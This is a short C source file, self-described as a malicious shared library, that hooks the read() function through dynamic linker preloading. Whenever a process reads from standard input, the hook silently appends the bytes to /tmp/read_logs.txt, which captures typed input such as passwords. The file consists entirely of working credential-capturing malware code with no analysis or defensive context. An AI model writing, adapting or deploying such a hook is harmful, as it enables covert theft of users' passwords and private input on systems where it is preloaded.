/**
 * Date : 15/03/2025 03:41 AM
 * Author : @TF
 * Description : Malicious Shared Library Hooking read() Functions.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

ssize_t read(int fd, void *buf, size_t count) {
    static ssize_t (*orig_read)(int, void *, size_t) = NULL;
    if (!orig_read) {
        orig_read = dlsym(RTLD_NEXT, "read");
    }

    ssize_t output = orig_read(fd, buf, count);

    if (fd == 0 && output > 0) {
        FILE *logfile = fopen("/tmp/read_logs.txt", "a");
        if (logfile) {
            fwrite(buf, 1, output, logfile);
            fputc('\n', logfile);
            fclose(logfile);
        }
    }

    return output;
}